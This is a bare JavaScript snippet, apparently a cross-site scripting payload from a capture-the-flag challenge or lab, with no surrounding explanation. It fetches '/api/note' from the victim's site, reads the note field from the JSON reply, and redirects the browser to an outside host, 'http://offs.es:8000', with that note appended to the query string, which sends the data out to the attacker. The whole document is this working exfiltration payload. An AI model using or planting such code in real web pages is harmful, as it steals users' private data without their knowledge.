(async () => {
  const r  = await fetch('/api/note');
  const j  = await r.json();
  location = 'http://offs.es:8000/?f=' + encodeURIComponent(j.note);
})();

